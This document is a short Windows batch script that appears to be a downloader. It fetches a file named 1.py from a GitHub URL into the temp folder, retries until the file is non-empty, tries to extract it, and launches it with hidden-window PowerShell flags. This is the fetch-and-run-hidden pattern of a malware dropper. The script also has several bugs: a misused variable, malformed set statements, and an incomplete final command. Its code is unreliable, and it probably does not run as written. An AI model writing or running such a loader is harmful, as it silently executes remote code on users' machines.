@echo off
setlocal
set "url=https://github.com/Marinff/test/blob/main/1.py"
set "tempdir = %temp%"
set "output = %tempdir%\1.py"
:download
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %output%"
for %%A in ("%output%") do (
    if %%~zA == 0 (
        del "%download%"
        timeout /t 1 > null
        goto download
    )
)
powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\1.py -WindowStyle "
exit
